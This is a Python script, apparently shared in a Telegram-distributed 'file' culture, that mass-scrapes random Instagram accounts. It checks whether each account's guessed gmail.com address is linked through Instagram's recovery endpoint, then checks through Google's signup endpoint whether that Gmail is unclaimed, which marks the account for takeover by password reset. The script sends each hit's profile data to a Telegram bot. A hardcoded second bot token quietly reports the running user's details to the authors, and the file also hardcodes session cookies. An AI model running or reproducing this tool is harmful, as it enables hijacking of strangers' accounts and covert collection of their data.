
import requests
import time
import os 
import random
import sys
from datetime import datetime

expiry_date = datetime(2027, 6, 29, 15, 59, 0)  

current_date = datetime.now()

if current_date > expiry_date:
    print("\n❌ Your Time Has Expired!")
    print("📞 LODE FILE EXPAIR HO JAYEGA TO DM AA  JANA ~ @nitexsh || @mkxaura")
    sys.exit()



os.system('clear')

import os
import requests
import uuid
import random
import json
import time
import sys
import cfonts
from cfonts import render
from threading import Thread, Lock
from uuid import uuid4
# colorama import add kiya hai taaki Fore aur Style features kaam karein
from colorama import init, Fore, Style

# Screen clear karne ke liye
os.system('clear')

# Cfonts se NITEXSH text render kiya
DVVMB = render('NITEXSH X KRISHN', colors=['red', 'white'], align='center')
print(DVVMB)
print()

# Colorama ko initialize kiya
init(autoreset=True)

# Shared variables aur Locks
_about_session_index = 0
_about_session_lock = Lock()
hit_lock = Lock()

# Shortcuts for Colors
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
C = Fore.CYAN
W = Fore.WHITE
M = Fore.MAGENTA
RESET = Style.RESET_ALL


#os tools by - NITEXSH
import requests
import uuid
import time
import random
import json
import string
import re
import os
import sys
import base64
import telebot
import secrets
import pyfiglet, os, shutil
from datetime import datetime
from threading import Thread
from concurrent.futures import ThreadPoolExecutor

def Erebus():
    os.system('')
    Erebus_text = pyfiglet.figlet_format("", font="slant")
    colors = ['\033[90m', '\033[96m', '\033[97m']
    RESET = '\033[0m'
    terminal_width = shutil.get_terminal_size().columns
    for i, line in enumerate(Erebus_text.splitlines()):
        color = colors[i % len(colors)]
        print(color + line.center(terminal_width))
    print(RESET)
    print('\033[90m' + ''.center(terminal_width) + RESET)
Erebus()

email = None
hits = 0
good = 0
taken = 0
bad = 0
limit = 0
info = {}
session = requests.session()
_session = requests.session()

E = '\033[1;31m'
W2 = '\x1b[38;5;120m'
W3 = '\x1b[38;5;204m'
W4 = '\x1b[38;5;150m'
W5 = '\x1b[1;33m'
W6 = '\x1b[1;31m'
W7 = "\033[1;33m"
W8 = '\x1b[2;36m'
W8 = '\x1b[38;5;117m'
W9 = "\033[1m\033[34m"
P = '\x1b[1;97m'
B = '\x1b[1;94m'
O = '\x1b[1;96m'
Z = '\x1b[1;30m'
X = '\x1b[1;33m'
F = '\x1b[2;32m'
Z = '\x1b[1;31m'
L = '\x1b[1;95m'
C = '\x1b[2;35m'
A = '\x1b[2;39m'
P = '\x1b[38;5;231m'
J = '\x1b[38;5;208m'
J1 = '\x1b[38;5;202m'
J2 = '\x1b[38;5;203m'
J21 = '\x1b[38;5;204m'
J22 = '\x1b[38;5;209m'
F1 = '\x1b[38;5;76m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m' 
X = '\033[1;33m' 
Z1 = '\033[2;31m' 
F = '\033[2;32m' 
A = '\033[2;34m'
C = '\033[2;35m' 
S = '\033[2;36m'
E = '\033[1;31m'
Y = '\033[1;33m'
Z = '\033[1;31m' 
X = '\033[1;33m' 
Z1 = '\033[2;31m' 
F = '\033[2;32m' 
A = '\033[2;34m'
C = '\033[2;35m' 
S = '\033[2;36m'
G = '\033[1;34m' 
HH='\033[1;34m' 
pink = "\033[1m\033[35m"
red = "\033[1m\033[31m"
green = "\033[1m\033[32m"
yellow = "\033[1m\033[33m"
blue = "\033[1m\033[34m"
cyan = "\033[1m\033[36m"
magenta = "\033[1m\033[35m"
M = "\033[1m\033[36m"
white = "\033[1m\033[37m"
orange = "\033[1m\033[38;5;208m"
reset = "\033[0m"
O = '\x1b[38;5;208m' ; Y = '\033[1;34m' ; C = '\033[2;35m' ; M = '\x1b[1;37m'
  
id = input("  \033[36m\033[0m 𝗘𝗻𝘁𝗲𝗿 𝗖𝗵𝗮𝘁 𝗜𝗱 ->\033[36m ")
token = TOKEN = input("  \033[33m\033[0m 𝗘𝗻𝘁𝗲𝗿 𝗕𝗼𝘁 𝗧𝗼𝗸𝗲𝗻 ->\033[36m ")
print("\n")
print(" \033[0m Wait File Loding...\033[36m\033[0m\033[36m \033[0m \033[1m\033[38;5;208m \033[0m")
BOT_TOKEN = "8804415519:AAEw-XY2gpSQAVDOsQG9PVLZTw2Zu9vYSBQ"
ADMIN_ID = ""  
bot = telebot.TeleBot(token)
try:
    chat = bot.get_chat(id)
    username = chat.username if chat.username else 'Not set'
    first_name = chat.first_name if chat.first_name else 'Unknown'
except Exception as ex:
    print(f'Error retrieving user info: {ex}')
    username = 'Unknown'
    first_name = 'Unknown'

# Bot info via API
url = f'https://api.telegram.org/bot{token}/getMe'
try:
    response = requests.get(url)
    response.raise_for_status()
    data = response.json()
    if data.get('ok'):
        bot_info = data['result']
        bot_id = bot_info.get('id')
        bot_username = bot_info.get('username')
    else:
        print(f'Error: {data.get("description")}')
        bot_id = 'Unknown'
        bot_username = 'Unknown'
except requests.exceptions.RequestException as ex:
    print(f'Bot info error: {ex}')
    bot_id = 'Unknown'
    bot_username = 'Unknown'
video_url = "https://t.me/itachihulala7878/828"
text = f'''
╭──────────────────╮
│            COLLEB FILE
╰──────────────────╯

𝑯𝒚 {first_name} 𝑬𝒏𝒋𝒐𝒚 𝒏𝒆𝒘 𝒇𝒊𝒍𝒆 𑁍

𝑫𝒆𝒗: @mkxaura // @nitexsh
'''
send_video_url = f"https://api.telegram.org/bot{token}/sendVideo"
requests.post(send_video_url, data={
    "chat_id": id,
    "video": video_url,
    "caption": text
})

notify_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
requests.post(notify_url, data={
    "chat_id": ADMIN_ID,
    "text": f"""
    Aᴄᴄᴇꜱꜱ Aᴘᴘʀᴏᴠᴇᴅ Fᴏʀ Uꜱᴇʀ❕
 ◌ USER ID ‣ {id}
 ◌ NAME ‣ {first_name}
 ◌ USERNAME ‣ @{username}
    ⚒️ TOOL DETEILS
 ⏔ HIGH FOLLOW
 ⇝ FREE PLAN   
 """
})

def display():
    os.system('cls' if os.name == "nt" else "clear")
    a = f""" 
           {cyan} {white} TRUE    :  {green}{hits:<3}{F}{cyan}
           {cyan} {white} BAD MAIL : {yellow}{taken:<3}{F}{cyan}
           {cyan} {white} BAD IG  : {red}{bad:<4}{F}{cyan}
           {cyan} {white} VAL MAIL :{blue}{good:<4}{F}{cyan}
 
                  {G}{white}  NITEXSH x MK{F}
 
 Email⇝ {blue}{email:<29}{F}{cyan}
 
"""
    print(a)

def get_tl():
	""" Fetch TL token """
	while True:
		url = "https://accounts.google.com/_/signup/validatepersonaldetails"
		params = {
		  'hl': "en-GB",
		  '_reqid': "46000",
		  'rt': "j"
		}
		payload = {
		  'continue': "https://accounts.google.com/ManageAccount?nc=1",
		  'f.req': "[\"AEThLlw3_SjR2r7ZvRrESUg3K4e9eBWmlOC4rULBmw9UAcZVy1db7ezAlKKPXcOeac71VE9Ducrl\",null,null,null,null,0,0,\"aesowns\",\"aesowns\",null,0,null,1,[],1]",
		  'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
		  'cookiesDisabled': "false",
		  'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
		  'gmscoreversion': "null",
		  'flowName': "GlifWebSignIn",
		  'checkConnection': "youtube:301",
		  'checkedDomains': "youtube",
		  'pstMsg': "1",
		  '': ""
		}
		headers = {
		  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
		  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
		  'x-same-domain': "1",
		  'google-accounts-xsrf': "1",
		  'sec-ch-ua-mobile': "?1",
		  'sec-ch-ua-platform': "\"Android\"",
		  'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
		  'origin': "https://accounts.google.com",
		  'x-client-data': "CP/xygE=",
		  'sec-fetch-site': "same-origin",
		  'sec-fetch-mode': "cors",
		  'sec-fetch-dest': "empty",
		  'referer': "https://accounts.google.com/createaccount?flowName=GlifWebSignIn&flowEntry=ServiceLogin",
		  'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
		  'Cookie': "__Host-GAPS=1:6oR-TWX06t3JKSEu3DqYRT_IWnQLlw:Rc9Z7lHTPNW6qMCN"
		}
		response = _session.post(url, params=params, data=payload, headers=headers, timeout=20)
		tl_1 = json.loads(response.text[5:])[0][1][2]
		url = "https://accounts.google.com/_/signup/validatebasicinfo"
		params = {
		  'hl': "en-GB",
		  'TL': tl_1,
		  '_reqid': "346000",
		  'rt': "j"
		}
		payload = {
		  'continue': "https://accounts.google.com/ManageAccount?nc=1",
		  'f.req': "[\"TL:"+ tl_1 +"\",2015,4,15,2,null,null,0,null,null,0,0]",
		  'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
		  'cookiesDisabled': "false",
		  'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
		  'gmscoreversion': "null",
		  'flowName': "GlifWebSignIn",
		  'checkConnection': "youtube:301",
		  'checkedDomains': "youtube",
		  'pstMsg': "1",
		  '': ""
		}
		headers = {
		  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
		  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
		  'x-same-domain': "1",
		  'google-accounts-xsrf': "1",
		  'sec-ch-ua-mobile': "?1",
		  'sec-ch-ua-platform': "\"Android\"",
		  'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
		  'origin': "https://accounts.google.com",
		  'x-client-data': "CP/xygE=",
		  'sec-fetch-site': "same-origin",
		  'sec-fetch-mode': "cors",
		  'sec-fetch-dest': "empty",
		  'referer': "https://accounts.google.com/signup/v2/birthdaygender?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL="+ tl_1,
		  'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
		  'Cookie': "__Host-GAPS=1:6oR-TWX06t3JKSEu3DqYRT_IWnQLlw:Rc9Z7lHTPNW6qMCN"
		}
		response = _session.post(url, params=params, data=payload, headers=headers, timeout=20)
		tl = json.loads(response.text[5:])[0][0][4].split("TL:")[1]
		with open("google.txt", "w") as w:
			w.write(tl)
Thread(target=get_tl, daemon=True).start()

def lookup(email):
	global bad, good
	""" IG Lookup """
	url = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
	device = str(uuid.uuid4())
	family = str(uuid.uuid4())
	android = "android-" + secrets.token_hex(8)
	payload = {
	  'params': "{\"client_input_params\":{\"aac\":\"{\\\"aac_init_timestamp\\\":"+ str(int(time.time())) +",\\\"aacjid\\\":\\\""+ str(uuid.uuid4()) +"\\\",\\\"aaccs\\\":\\\""+ secrets.token_urlsafe(32) +"\\\"}\",\"flash_call_permissions_status\":{\"READ_PHONE_STATE\":\"PERMANENTLY_DENIED\",\"READ_CALL_LOG\":\"DENIED\",\"ANSWER_PHONE_CALLS\":\"DENIED\"},\"was_headers_prefill_available\":0,\"network_bssid\":null,\"sfdid\":\"\",\"fetched_email_token_list\":{},\"search_query\":\""+ email +"\",\"auth_secure_device_id\":\"\",\"ig_oauth_token\":[],\"cloud_trust_token\":null,\"was_headers_prefill_used\":0,\"sso_accounts_auth_data\":[],\"encrypted_msisdn\":\"\",\"device_network_info\":null,\"text_input_id\":\"akyuf0:61\",\"zero_balance_state\":null,\"android_build_type\":\"release\",\"accounts_list\":[],\"is_oauth_without_permission\":0,\"ig_android_qe_device_id\":\""+ device +"\",\"gms_incoming_call_retriever_eligibility\":\"client_not_supported\",\"search_screen_type\":\"email_or_username\",\"is_whatsapp_installed\":1,\"lois_settings\":{\"lois_token\":\"\"},\"ig_vetted_device_nonce\":null,\"headers_infra_flow_id\":\"\",\"fetched_email_list\":[]},\"server_params\":{\"event_request_id\":\""+ str(uuid.uuid4()) +"\",\"is_from_logged_out\":0,\"layered_homepage_experiment_group\":null,\"device_id\":\""+ android +"\",\"login_surface\":\"login_home\",\"waterfall_id\":\""+ str(uuid.uuid4()) +"\",\"INTERNAL__latency_qpl_instance_id\":6.3987980400102E13,\"is_platform_login\":0,\"context_data\":\"\",\"login_entry_point\":\"logged_out\",\"INTERNAL__latency_qpl_marker_id\":36707139,\"family_device_id\":\""+ family +"\",\"offline_experiment_group\":\"caa_iteration_v3_perf_ig_4\",\"access_flow_version\":\"pre_mt_behavior\",\"is_from_logged_in_switcher\":0,\"qe_device_id\":\""+ device +"\"}}",
	  'bk_client_context': "{\"bloks_version\":\"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b\",\"styles_id\":\"instagram\"}",
	  'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
	}
	headers = {
	  'User-Agent': "Instagram 370.1.0.43.96 Android (34/14; 450dpi; 1080x2207; samsung; SM-A235F; a23; qcom; en_IN; 704872281)",
	  'accept-language': "en-IN, en-US",
	  'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
	  'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
	  'x-ig-android-id': android,
	  'x-ig-app-id': "567067343352427",
	  'x-ig-app-locale': "en_IN",
	  'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
	  'x-ig-device-id': device,
	  'x-ig-family-device-id': family,
	  'x-ig-timezone-offset': str(datetime.now().astimezone().utcoffset().total_seconds()),
	  'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
	  'x-pigeon-rawclienttime': str(time.time()),
	  'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
	}
	response = requests.post(url, data=payload, headers=headers, timeout=20)
	if f"{email}" in response.text:
		good+=1
		display()
		check_gmail(email)
	elif 'Sorry, something' in response.text:
		limit+=1
		display()
	else:
		bad+=1
		display()

def check_gmail(email):
	""" Check gmail availibility """
	global hits, taken
	usr = email.split("@")[0]
	with open("google.txt", "r") as ys:
		tl = ys.read().strip()
	url = "https://accounts.google.com/_/signup/usernameavailability"
	params = {
	  'hl': "en-GB",
	  'TL': tl,
	  '_reqid': "446000",
	  'rt': "j"
	}
	payload = {
	  'continue': "https://accounts.google.com/ManageAccount?nc=1",
	  'f.req': "[\"TL:"+ tl +"\",\""+ usr +"\",0,0,1,null,1,2464]",
	  'azt': "AFoagUUWePV-jOFGpL5c7eI9kfCfGnCl5w:1776669382039",
	  'cookiesDisabled': "false",
	  'deviceinfo': "[null,null,null,null,null,\"IN\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,2,2,2]",
	  'gmscoreversion': "null",
	  'flowName': "GlifWebSignIn",
	  'checkConnection': "youtube:301",
	  'checkedDomains': "youtube",
	  'pstMsg': "1",
	  '': ""
	}
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'x-same-domain': "1",
	  'google-accounts-xsrf': "1",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'x-chrome-connected': "source=Chrome,eligible_for_consistency=true",
	  'origin': "https://accounts.google.com",
	  'x-client-data': "CP/xygE=",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://accounts.google.com/signup/v2/createusername?flowName=GlifWebSignIn&flowEntry=ServiceLogin&TL="+ tl,
	  'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
	  'Cookie': "__Host-GAPS=1:6oR-TWX06t3JKSEu3DqYRT_IWnQLlw:Rc9Z7lHTPNW6qMCN"
	}
	response = _session.post(url, params=params, data=payload, headers=headers, timeout=20)
	if '"gf.uar",1' in response.text:
		hits+=1
		display()
		gmail = get_masked(usr)
		bot(token, id, gmail, usr, email)
	else:
		taken+=1
		display()
		
def get_masked(query):
	""" Fetch masked email """
	url = "https://www.instagram.com/api/graphql"
	payload = {
	  'av': "0",
	  '__d': "www",
	  '__user': "0",
	  '__a': "1",
	  '__req': "f",
	  '__hs': "20563.HYP:instagram_web_pkg.2.1...0",
	  'dpr': "3",
	  '__ccg': "GOOD",
	  '__rev': "1037676804",
	  '__s': "nz2w5z:1vm2xs:94sap8",
	  '__hsi': "7630740602831122681",
	  '__dyn': "7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awt81s8hwnU6a3a1YwBgao6C0Mo2swlo5q4U2zxe2GewGw9a361qw8Xwn8e87q0oa2-azo7u3u2C2O0Lo6-3u2WE5B0bK1Iwqo5p0qZ6goK10xKi2K7E5y2-1mwa6byohw5ywuU1FU",
	  '__csr': "hcfEI9NcRh48hnvNdsyaD6RnvOldSySDHBpKBLAF6ypAEzC4-ILahjF6S_ui-np4bmqhfR8gCaWFOmjgyiLt9EJ8FeiiGjFeaUO5XyjkBKUhByUGuhddpufW8yZeXx6aCxVxSaz8ycFbxVacxDCx2q8wwG8wHypp9UOawPADz8yaAgO9yVHwiqz89EhwCw05Cuw2eE1ooCU0gByU6IE1gUqU1ao0Vdw2tFnw1ud06Ca0M8fEx2UN7y4bEM3wo1JU2RwSyaOcayU6d7gy0A-9wi6320Ho0N60W8S02VS09vw0lWo",
	  '__hsdp': "gSw8N0I1apBoBrysxGCA9cxkImy-u547Fu1lg13o6u8xy458eQ2Smm50y4FEC2Gce4mE64M09g80n9w6QG09SwjE0iCw5Nw",
	  '__hblp': "05twAU5q0gum1MwuU24xS6FU98Sq0E8e88Uowda0Ek0S9U1hE0igwmuq6rwa608Gw4BwaK0BUhw9SfwXUcE34w2iE4W09iweK2O0jG1rx-8wZwaW0iq3u",
	  '__sjsp': "gSw8N0I1apBoBrysxGCA8yElaxibVUkg9e0mi1Dy8ox1i3J0JBBxg8xaq9wTe",
	  '__comet_req': "7",
	  'lsd': "AdRhedp9xNI2uNuFwNJXmbUAOw8",
	  'jazoest': "22394",
	  '__spin_r': "1037676804",
	  '__spin_b': "trunk",
	  '__spin_t': "1776670246",
	  '__crn': "comet.igweb.PolarisCAAIGAccountRecoverySearchRoute",
	  'qpl_active_flow_ids': "516759801",
	  'fb_api_caller_class': "RelayModern",
	  'fb_api_req_friendly_name': "CAAIGAccountSearchViewQuery",
	  'server_timestamps': "true",
	  'variables': "{\"params\":{\"event_request_id\":\"7ca5daae-5770-42dd-b77b-0cf23a865a7f\",\"next_uri\":\"\",\"search_query\":\""+ query +"\",\"waterfall_id\":\"553aadae-3ec5-4031-8395-efbabcc670ce\"}}",
	  'doc_id': "26178667145161478",
	  'fb_api_analytics_tags': "[\"qpl_active_flow_ids=516759801\"]"
	}
	headers = {
	  'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'sec-ch-ua-model': "\"\"",
	  'x-ig-app-id': "936619743392459",
	  'x-ig-max-touch-points': "5",
	  'sec-ch-ua-mobile': "?0",
	  'x-fb-friendly-name': "CAAIGAccountSearchViewQuery",
	  'x-fb-lsd': "AdRhedp9xNI2uNuFwNJXmbUAOw8",
	  'sec-ch-ua-platform-version': "\"\"",
	  'x-asbd-id': "359341",
	  'sec-ch-ua-full-version-list': "\"Chromium\";v=\"139.0.7339.0\", \"Not;A=Brand\";v=\"99.0.0.0\"",
	  'sec-ch-prefers-color-scheme': "dark",
	  'x-csrftoken': "o_6jxh33ZvsQ2eFMyRaM_q",
	  'sec-ch-ua-platform': "\"Linux\"",
	  'origin': "https://www.instagram.com",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': "https://www.instagram.com/accounts/password/reset/",
	  'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
	  'Cookie': "csrftoken=o_6jxh33ZvsQ2eFMyRaM_q; datr=YMnlaTJAraHY5ADdYH8UqsTG; ig_did=2046A480-DF50-4660-A5CD-DC58F57C7A1C; mid=aeXJYAABAAGoDWzGwrGALDqzE3Np; dpr=3.558248996734619; wd=774x749"
	}
	response = requests.post(url, data=payload, headers=headers, timeout=20)
	email = next((i["contact_point"] for i in response.json() ["data"]["caa_ar_ig_account_search"]["contact_points"] if i["type"] == "EMAIL"), None)
	if email:
		return email
	else:
		return None

def bot(token, id, gmail, usr, email):
		""" Send hits to TG bot """
		username = usr
		data = info.get(username, {})
		business = data.get('is_business', None)
		followers = data.get('follower_count', None)
		followings = data.get('following_count', None)
		posts = data.get('media_count', None) or 0
		private = data.get('is_private', None)
		name = data.get('full_name', None)
		biography = data.get('biography', None)
		business = business if business is not None else 'None'
		followers = followers if followers is not None else 'None'
		followings = followings if followings is not None else 'None'
		private = private if private is not None else 'None'
		name = name if name is not None else 'None'
		biography = biography if biography is not None else 'None'
		if gmail:
			mail = gmail
		else:
			mail = 'None'
		if posts > 2:
			meta = 'True'
		else:
			meta = 'False'
		try:
			content = f"""
COLLEB FILE @mkxaura // @nitexsh 
𒋨────━𓆩MK x Nitesh𓆪‌‏━────𒋨

 USERNAME : @{username}
 EMAIL  : {email}
 FULL NAME : {name}
 FOLLOWERS : {followers}
 FOLLOWINGS : {followings}
 POSTS  : {posts}
 META  : {meta}
 BIO   : {biography}
 DOMAIN : gmail.com
 RESET  : {mail}
 LINK   :https://instagram.com/{username}

𒋨────━𓆩NITEXSH𓆪‌‏━────𒋨
𝑫𝒆𝒗 ‣ @nitexsh // @mkxaura
"""
			response = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={content}", timeout=20)
		except:
			with open('Fʟᴡʀ Hɪᴛs.txt', 'a') as a:
				a.write(f'{content}\n')

def get_tokens():
    """ Fetching and saving CSRF ans LSD tokens """
    while True:
        try:
            headers = {
                'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
                'x-ig-app-id': "936619743392459",
                'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
                'origin': "https://www.instagram.com",
                'referer': "https://www.instagram.com/",
            }
            response = session.get('https://www.instagram.com/', headers=headers, timeout=20)
            csrf = response.cookies.get('csrftoken', '')
            find = re.search(r'"LSD",\[\],\{"token":"(.*?)"\}', response.text)
            lsd = find.group(1) if find else None
            with open("tokens.txt", "w") as fd:
            	fd.write(f"{csrf}|{lsd}")
        except:
            pass
Thread(target=get_tokens, daemon=True).start()

def load_tokens():
    """ Loading tokens from file """
    try:
        with open('tokens.txt', 'r') as file:
            parts = file.read().strip().split("|")
            if len(parts) == 2:
                csrf, lsd = parts
                if csrf and lsd:
                    return csrf, lsd
    except Exception:
        pass
    return "bKPOnxXALzrHjjhgVUSXUWvsJSheI52L", "9CaKjXH_JGbfD4zZaTfZ8a"

def get_usernames():
    """ Scrap Usernames """
    global email
    while True:
        csrf, lsd = load_tokens()
        cookies = {
            'rur': '"HIL\\0545636887483\\0541808136332:01fe43b89fcef61b8a466bfa81acf2b1bbab08f406fc99b1da8b7d889fa68683a3364c43"'
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            'Content-Type': 'application/x-www-form-urlencoded',
            'x-bloks-version-id': "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
            'x-ig-app-id': '936619743392459',
            'x-fb-lsd': lsd,
            'sec-ch-prefers-color-scheme': 'light',
            'x-csrftoken': csrf,
            'sec-ch-ua-platform': '"Android"',
            'origin': 'https://www.instagram.com',
            'sec-fetch-site': 'same-origin'
        }
        payload = {
            'lsd': lsd,
            'variables': json.dumps({"userID": random.randint(2500000000, 21254029834), "username": "cristiano"}),
            'doc_id': '7717269488336001',
        }
        response = session.post('https://www.instagram.com/api/graphql', headers=headers, data=payload, cookies=cookies, timeout=20)
        try:
            username = response.json().get('data', {}).get('user', {}).get('username', {})
            followers = response.json().get('data', {}).get('user', {}).get('follower_count', {})
            id = response.json().get('data', {}).get('user', {}).get('pk', {})
            if username and id and followers and followers > 20:
                info[username] = response.json().get('data', {}).get('user', {})
                email = username + '@gmail.com'
                lookup(email)
        except:
            pass
with ThreadPoolExecutor(max_workers=100) as executor:
    for _ in range(200):
        executor.submit(get_usernames)
      
